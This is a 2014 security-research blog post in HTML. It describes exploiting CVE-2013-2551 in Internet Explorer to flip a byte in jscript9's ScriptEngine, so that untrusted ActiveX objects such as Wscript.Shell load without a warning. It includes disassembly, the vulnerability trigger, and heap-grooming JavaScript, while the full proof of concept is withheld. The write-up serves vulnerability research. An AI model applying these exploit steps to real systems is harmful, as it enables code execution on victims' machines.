@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="">
+  <meta name="author" content="">
+
+  <title>Daniel Moghimi</title>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+  <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.rawgit.com/jpswalsh/academicons/master/css/academicons.min.css">
+
+
+
+  <!-- Custom styles for this template -->
+  <link href="/css/blog-post.css" rel="stylesheet">
+
+</head>
+
+<body>
+
+  <!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-dark bg-dark fixed-top">
+    <div class="container">
+      <a class="navbar-brand" href="#">Daniel Moghimi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+      <a href=https://twitter.com/danielmgmi><i class="navbar-brand fa fa-twitter" style="font-size:24px"></i></a>
+      <a href=https://www.linkedin.com/in/daniel-moghimi-75071a109/><i class="navbar-brand fa fa-linkedin" style="font-size:24px"></i></a>
+      <a href=http://github.com/danielmgmi><i class="navbar-brand fa fa-github" style="font-size:24px"></i></a>
+      <a href=https://scholar.google.com/citations?user=OXLo0LMAAAAJ&hl=en><i class="navbar-brand ai ai-google-scholar-square" style="font-size:24px"></i></a>
+
+      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          <li class="nav-item">
+            <a class="nav-link" href="/index.html">Home</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="/publication.html">Publication</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="/advisory.html">Security Advisory</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="/blog.html">Blog</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="/video.html">Video</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="/press.html">In the Press</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+
+  <!-- Page Content -->
+  <div class="container">
+
+    <div class="row">
+
+      <!-- Post Content Column -->
+      <div class="col-lg-8">
+
+        <!-- Title -->
+        <h1 class="mt-4">Subverting without EIP</h1>
+
+        <!-- Author -->
+        <p class="lead">
+          by
+          <a href="#">Daniel Moghimi</a>
+        </p>
+
+        <hr>
+
+        <!-- Date/Time -->
+        <p>Posted on May 08, 2014 at 11:37 AM</p>
+
+      
+        <hr>
+        <blockquote>
+          <p style="text-align: justify;">This post is recovered from my old website/blog: mallocat.com</p>
+          <p style="text-align: justify;">Few months ago, I did some research about a vulnerability in Internet Explorer (IE) browser. I have always thought that it would be possible to exploit other primitives in web browsers, As a result I came up with this write-up which discusses a different exploitation method in Internet Explorer. As an example, I exploited (CVE-2013-2551 / MS13-037) by this innovative method. The issue is reported to Microsoft, and I postponed my disclosure.</p>
+          </blockquote>
+          <h4><b>Abstract</b></h4>
+          <p style="text-align: justify;">Various protections have been added to the Windows operating system (OS) to defend against software exploitation. These protections are based on restricting the  attacker to gain control over the EIP register and to execute binary shellcode. The cat and mouse game between vendors to implement better protections and the hacker community to bypass them is a long (cliche) story. The offensive security community have tried to invent new methods to gain control over EIP by bypassing protections such as Stack cookie, Safe SEH, VTable guard, and to facilitate shellcode executing by bypassing protections such as ASLR, DEP. In this article, I am going to leave EIP alone and forget about running shellcode to gain code execution. Instead, we can exploit better primitives to even gain code execution without direct control over the EIP register.</p>
+          
+          <h3 class="western">Introduction</h3>
+          <p class="western" style="margin-bottom: 0.11in; text-align: justify;" align="JUSTIFY">Applications have some features that are not enabled by default because of security considerations and testing, or there exists  undocumented behavior in the software that is unknown to normal users. Most of the time, when a user wants to access such features, a warning pops up indicating possible harms or instability in the system. One have to enable those features manually through some specific configurations. Here are some examples of such warnings in well-known client side applications:</p>
+          
+          <ul>
+             <li>
+          <p style="margin-bottom: 0.11in;" align="JUSTIFY">Java script Geolocation API: (Is it possible to disable this warning and steal Geolocation data?!)</p>
+          
+          <h5><img src="/media/subverting_1.png" alt="111" width="570px" height="70px" /></h5>
+          </li>
+          </ul>
+          <ul>
+             <li>
+          <p style="margin-bottom: 0.11in;" align="JUSTIFY">Adobe Action script 3 Camera &amp; Sound API: (Is it possible to disable this warning and record microphone and camera without user permission?!)</p>
+          
+          <h5><img src="/media/subverting_2.png" alt="111" /></h5>
+          </li>
+          </ul>
+          <ul>
+             <li>
+          <p style="margin-bottom: 0.11in;">Microsoft Internet explorer ActiveX controls: (Is it possible to load harmful ActiveX controls and execute malicious code?)</p>
+          
+          <h5><img src="/media/subverting_3.png" alt="111" /></h5>
+          </li>
+          </ul>
+          <p class="western" style="margin-bottom: 0.11in;" align="JUSTIFY">Further some developer features exist that would not throw  warning, but they are not accessible in the default configuration. For example:</p>
+          
+          <ul>
+             <li>
+          <p style="margin-bottom: 0.11in;" align="JUSTIFY">Firefox XPCOM interface (Only accessible through chrome privileged mode)</p>
+          </li>
+             <li>
+          <p style="margin-bottom: 0.11in;" align="JUSTIFY">Google chrome Extension Javascript API</p>
+          </li>
+          </ul>
+          <p class="western" style="margin-bottom: 0.11in;" align="JUSTIFY">The generic idea is to patch such restrictions in the memory with the help of  a memory corruption vulnerability. This would let attackers perform harmful things and steal sensitive information.</p>
+          
+          <h3 class="western">ActiveX</h3>
+          <p class="western" style="margin-bottom: 0.11in;" align="JUSTIFY">Internet explorer does not support the default plugin interface implemented by other browsers, and it is not possible to enumerate supported plugins by the Javascript object <i>navigator.plugin:</i></p>
+          
+          <table width="602" cellspacing="0" cellpadding="7"><colgroup> <col width="586" /> </colgroup>
+          <tbody>
+          <tr>
+          <td style="border-style: solid; border-color: #00000a; padding: 0in 0.08in 0in 0.07in;" valign="TOP" bgcolor="#ffffff" width="586">
+          <p class="western" style="margin-left: 0.21in; text-indent: -0.21in; margin-bottom: 0in;"><span style="color: #0000ff;"><span style="font-family: Consolas, serif;"><span style="font-size: 8pt;">&gt;&gt; navigator.plugins.length </span></span></span></p>
+          <p class="western" style="margin-left: 0.21in;"><span style="color: #000000;"><span style="font-family: Consolas, serif;"><span style="font-size: 8pt;">0</span></span></span></p>
+          </td>
+          </tr>
+          </tbody>
+          </table>
+          <p class="western" style="margin-bottom: 0.11in; text-align: justify;" align="JUSTIFY">IE supports the old ActiveX COM interface to extend browser features. ActiveX has introduced many security issue in earlier versions of IE, but nowadays it is only possible to run some trusted ActiveX through the JavaScript interface. As a result, the browser warns the user if a web page tries to load Untrusted ActiveX controls. A list of trusted ActiveX controls that run without permission can be obtained in Manage Add-ons window:</p>
+          
+          <h5><img src="/media/subverting_4.png" alt="111" width="550px" height="400px" /></h5>
+          <p class="western" style="margin-bottom: 0.11in;">For better understating of the ActiveX architecture and its security, you can review the Black hat 2008 paper from<i> </i><span style="color: #0000ff;"><span lang="zxx"><u><a href="http://www.blackhat.com/presentations/bh-usa-08/Sotirov_Dowd/bh08-sotirov-dowd.pdf"><i>Alexander Sotirov and Mark Dowd</i></a></u></span></span> talk.</p>
+          
+          <h3 class="western">One-byte patch security bypass</h3>
+          <p class="western" style="margin-bottom: 0.11in;" align="JUSTIFY">What would happen if we try to load other ActiveX objects not listed as trusted through <i>ActiveX Object </i>function?</p>
+          
+          <pre class="lang:js decode:true">var x = new ActiveXObject('Wscript.Shell');</pre>
+          The function <i>ScriptSite::CreateActiveXObject</i> in jscript9.dll is responsible to handle this Javascript function, and it calls <i>ScriptSite::CreateObjectFromProgID</i> to create the object from its ProgId:
+          <pre class="lang:asm decode:true ">.text:10131A32 mov byte ptr [ebp-4], 1
+          .text:10131A36 mov esi, [ebp+8]
+          .text:10131A39 push eax
+          .text:10131A3A push dword ptr [ebp+10h]
+          .text:10131A3D mov edx, esi
+          .text:10131A3F call ScriptSite::CreateObjectFromProgID(ushort const *,ushort const *,IUnknown * *)
+          .text:10131A44 mov byte ptr [ebp-4], 0</pre>
+          If <i>ScriptSite::CreateObjectFromProgID</i> succeed, we will get a handle to the ActiveX object, and if the function does not succeed we will reach the following code path that in case of improper permission, it will warn the user for harmful ActiveX control:
+          <pre class="lang:asm decode:true ">.text:1010B069 loc_1010B069:
+          .text:1010B069 mov edi, ebx
+          .text:1010B06B call Js::JavascriptError::ThrowError(Js::ScriptContext *,long,ushort const *)
+          .text:1010B070 int 3 ; Trap to Debugger</pre>
+          <i>ScriptSite::CreateObjectFromProgID</i> function calls <i>CoGetClassObject</i> to communicate with COM interface of the requested object in the following code:
+          <pre class="lang:asm decode:true ">.text:10131BB5 push eax ; dwClsContext
+          .text:10131BB6 lea eax, [ebp+clsid]
+          .text:10131BB9 push eax ; rclsid
+          .text:10131BBA call CoGetClassObject(x,x,x,x,x)
+          .text:10131BC0 test eax, eax</pre>
+          Before reaching this code, a call to <i>ScriptEngine::CanCreateObject </i>is performed:
+          <pre class="lang:asm decode:true">.text:10131B8A lea eax, [ebp+clsid]
+          .text:10131B8D push eax
+          .text:10131B8E mov eax, [esi+4]
+          .text:10131B91 call ScriptEngine::CanCreateObject(_GUID const &amp;)
+          .text:10131B96 test eax, eax
+          .text:10131B98 jz loc_1010AFC7</pre>
+          <em>ScriptEngine::CanCreateObject</em> checks some configuration and security and it returns true or false weather it is possible to create that object. If we could force this function to always return true (Good trick to backdoor internet explorer via jscript9.dll), it is possible to load any ActiveX object in the browser without user's permission.
+          <p class="western" style="margin-bottom: 0.11in;" align="JUSTIFY">In the first lines of this function, some field at offset +1E4h of ScriptEngine class is checked:</p>
+          
+          <pre class="lang:asm decode:true ">.text:10131F75 public: int __thiscall ScriptEngine::CanCreateObject(struct _GUID const &amp;) proc near
+          .text:10131F75 var_8 = byte ptr -8
+          .text:10131F75 var_4 = dword ptr -4
+          .text:10131F75 arg_0 = dword ptr 8
+          .text:10131F75
+          .text:10131F75 mov edi, edi
+          .text:10131F77 push ebp
+          .text:10131F78 mov ebp, esp
+          .text:10131F7A push ecx
+          .text:10131F7B push ecx
+          .text:10131F7C push edi
+          .text:10131F7D mov edi, eax
+          .text:10131F7F test byte ptr [edi+1E4h], 8
+          .text:10131F86 jz short loc_10131FC5</pre>
+          And if we could have control on this value, it would be possible to force the function to return true without any further security check:
+          <pre class="lang:asm decode:true ">.text:10131FC5 xor eax, eax
+          .text:10131FC7 inc eax
+          .text:10131FC8 jmp short loc_10131FC0</pre>
+          <h3>Attack Demonstration: CVE-2013-2551</h3>
+          To Sum it up untill here, if we are able to null the one-byte value at offset +1E4 of <i>ScriptEngine object</i> before reaching this code by a 1-byte write primitive gained from some vulnerability, we can load untrusted ActiveX Controls without restrictions. This is powerful enough to execute malicious code without challenging memory protections.
+          <p class="western" style="margin-bottom: 0.11in;" align="JUSTIFY"><span style="background-position: initial initial; background-repeat: initial initial;">CVE-2013-2551</span> is an integer overflow vulnerability in VML rendering engine demonstrated by Nicolas July of VUPEN at Pwn2Own 2013 hacking contest. The vulnerability can be triggered by the following code:</p>
+          
+          <pre class="lang:java decode:true ">&lt;v:oval&gt;&lt;v:stroke id=x1 dashstyle="0 1"/&gt;&lt;/v:oval&gt;
+          &lt;script&gt;
+          x1 = document.getElementById("x1");
+          x1.dashstyle.array.length = -1;
+          &lt;/script&gt;</pre>
+          This doesn’t crash the browser but the negative value will be downsized to 0xffff and would be set as length of some array structure. So after that it is possible to write past the array buffer by the help of item property of a dashstyle array:
+          <pre class="lang:js decode:true ">x1.dashstyle.array.item(0xffff) = 0x41414141;</pre>
+          And this write4 condition is enough to exploit ScriptEngine object. For this purpose we should position this Array object and ScriptEngine object in the proper memory location. The ScriptEngine object constructor can be found at <i>CJScript9ClassFactory::AllocateEngine</i>:
+          <pre class="lang:asm decode:true ">.text:10086417 push eax
+          .text:10086418 mov eax, [ebp+arg_0]
+          .text:1008641B push esi
+          .text:1008641C call ScriptEngine::ScriptEngine(_GUID const &amp;,ushort const *)</pre>
+          And before a call to the constructor, there is an allocation of size = 0x210 for this object:
+          <pre class="lang:asm decode:true ">.text:100863FB push 210h ; Size
+          .text:10086400 mov ecx, offset HeapAllocator HeapAllocator::Instance
+          .text:10086405 call HeapAllocator::NoThrowAlloc(uint)
+          .text:1008640A mov esi, eax</pre>
+          The function <i>HeapAllocator::NoThrowAlloc</i> uses malloc function:
+          <pre class="lang:asm decode:true ">.text:10001350 ; int __stdcall HeapAllocator__NoThrowAlloc(size_t Size)
+          .text:10001350 Size = dword ptr 8
+          .text:10001350
+          .text:10001350 mov edi, edi
+          .text:10001352 push ebp
+          .text:10001353 mov ebp, esp
+          .text:10001355 push [ebp+Size] ; Size
+          .text:10001358 call ds:__imp__malloc</pre>
+          So this object is allocated by CRT_HEAP. By loading a new page a new script context can be created so a new ScriptEngine instance. But we cannot find address of current ScriptEngine object without any memory leakage. Although the mentioned vulnerability allow memory leakage as demonstrated but it is possible to exploit this vulnerability in a simpler way.
+          <p class="western" style="margin-bottom: 0.11in;" align="JUSTIFY">When we reset the size of DashStyle array length the<i> vgx!COALineDashStyleArray::put_length</i> function call <i>MsoIAppendPx</i> and this function calculate and allocate the new memory for the array in the following chunk of code:</p>
+          
+          <pre class="lang:asm decode:true ">.text:10075F0F shr ecx, 10h
+          .text:10075F12 and ecx, 7FFFh
+          .text:10075F18 add ecx, esi
+          .text:10075F1A mov esi, ecx
+          .text:10075F1C imul esi, edx
+          .text:10075F1F xor edx, edx
+          .text:10075F21 mov eax, esi
+          .text:10075F23 div [ebp+arg_0]
+          .text:10075F26 cmp eax, ecx
+          .text:10075F28 jnz short loc_10075F37
+          .text:10075F2A push esi ; Size
+          .text:10075F2B lea esi, [edi+0Ch]
+          .text:10075F2E call MsoFAllocMemCore(x,x,x)</pre>
+          Vgx!MsoFAllocMemCore uses the same malloc and CRT_HEAP for this allocation:
+          <pre class="lang:asm decode:true ">.text:10039ADA mov ebp, esp
+          .text:10039ADC push [ebp+Size] ; Size
+          .text:10039ADF call ds:__imp__malloc
+          .text:10039AE5 pop ecx</pre>
+          It is possible to allocate same size 0x210 DashStyle array object by just setting its length value to proper value of 0x80:
+          <pre class="lang:js decode:true">var strokes = []
+          for(var i = 0; i &lt; 200; i++)
+            strokes.push(document.getElementById("x"+i.toString()));
+          for(var i = 0; i &lt; 200; i++)
+            strokes[i].dashstyle.array.length = 0x80;</pre>
+          Then it's time to allocate a new ScriptEngine Object:
+          <pre class="lang:js decode:true">document.getElementById("f1").src = "js.htm";</pre>
+          loading a new page which contains JavaScript in an iframe force the browser to instantiate a new ScriptEngine Object and the heap layout would be like this:
+          <h5><img src="/media/subverting_5.png" alt="111" /></h5>
+          <p class="western" style="margin-bottom: 0.11in;" align="JUSTIFY">This heap layout give us the ability to patch the magic field and load arbitrary ActiveX Control.</p>
+          <p class="western" style="margin-bottom: 0.11in;" align="JUSTIFY">check the video:</p>
+          <p class="western" style="margin-bottom: 0.11in;" align="JUSTIFY">[removed link]</p>
+          <p class="western" style="margin-bottom: 0.11in;" align="JUSTIFY">and source code [removed link] for the proof of concept.</p>
+          
+          <h3 class="western">Summary</h3>
+          <ol>
+             <li class="western">This method is more reliable than classical code execution since it does not depend on on Operating system version and protections. By only patching the proper value in memory, one can get a reliable code execution which is not based on binary shellcode.</li>
+             <li>
+          <p style="margin-bottom: 0.11in;">Less suspicious than other methods, and intrusion prevention systems which are based on shellcode detection can not detect it.</p>
+          </li>
+             <li>
+          <p style="margin-bottom: 0.11in;">It requires the proper bug to give write condition, and/or we should leak the memory to find the  favorite script object to patch.</p>
+          </li>
+             <li>
+          <p style="margin-bottom: 0.11in;">It may be possible to implement similar methods on the other mentioned primitives.</p>
+          </li>
+          </ol>
+
+        <hr>
+      </div>
+
+      <!-- Sidebar Widgets Column -->
+      <div class="col-md-4">
+
+        <div class="card my-4">
+          <h5 class="card-header">Posts</h5>
+          <div class="card-body">
+            <div class="row">
+              <div class="col-lg-12">
+                <ul class="list-unstyled mb-0">
+                  <li><a href=/blog/subverting-without-eip.html>05/08/2014 - Subverting without Eip</a></li>
+                  <li><a href=/blog/pool-blade.html>03/19/2014 - Pool Blade</a></li>
+                  <li><a href=/blog/another-journey-to-antivirus-escalation.html>10/20/2013 - Another journey to antivirus escalation</a></li>
+                  <li><a href=/blog/a-journey-to-antivirus-escalation.html>08/02/2013 - A journey to antivirus escalation</a></li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+
+
+        <!-- Side Widget -->
+        <div class="card my-4">
+          <div class="card-body">
+            <a class="twitter-timeline" href="https://twitter.com/danielmgmi?ref_src=twsrc%5Etfw">Tweets by danielmgmi</a> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+          </div>
+        </div>
+
+      </div>
+
+    </div>
+    <!-- /.row -->
+
+  </div>
+  <!-- /.container -->
+
+  <!-- Footer -->
+  <footer class="py-5 bg-dark">
+    <div class="container">
+      <p class="m-0 text-center text-white">Copyright &copy; Your Website 2019</p>
+    </div>
+    <!-- /.container -->
+  </footer>
+
+  <!-- Bootstrap core JavaScript -->
+  <script src="vendor/jquery/jquery.min.js"></script>
+  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+</body>
+
+</html>
